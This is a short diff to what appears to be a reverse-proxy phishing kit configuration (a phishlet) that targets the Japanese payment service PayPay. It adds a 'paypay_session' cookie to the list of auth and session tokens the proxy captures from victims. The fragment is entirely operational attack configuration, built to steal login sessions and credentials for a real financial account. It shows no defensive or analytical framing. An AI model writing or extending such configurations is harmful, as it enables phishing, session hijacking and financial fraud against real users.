@@ -23,7 +23,7 @@ proxy_hosts:
 
 auth_tokens:
   - domain: '.paypay.ne.jp'
-    keys: ['session', 'sessionid', 'auth_token', 'access_token', 'token']
+    keys: ['session', 'sessionid', 'auth_token', 'access_token', 'token', 'paypay_session']
     type: 'cookie'
 
 credentials:
